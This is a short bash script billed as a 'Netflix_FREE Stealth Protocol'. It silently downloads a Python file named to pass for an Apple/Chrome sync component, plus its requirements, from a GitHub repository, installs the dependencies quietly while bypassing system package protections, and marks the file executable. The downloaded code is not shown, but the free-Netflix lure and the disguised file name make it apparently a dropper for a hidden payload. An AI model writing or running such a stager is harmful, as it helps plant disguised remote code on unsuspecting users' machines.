#!/bin/bash
echo "[*] Initializing Netflix_FREE Stealth Protocol..."

# 1. Télécharger les fichiers nécessaires depuis ton repo
# On s'assure qu'ils arrivent sur le Desktop
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/requirements.txt

# 2. Installer les dépendances (Bypass PEP 668)
# On utilise --break-system-packages car tu es hors venv dans ton screen
pip3 install -r requirements.txt --break-system-packages --quiet

# 3. Accorder les permissions
chmod +x com.apple.chrome.sync.py

echo "[+] Environment Ready. Lock in."
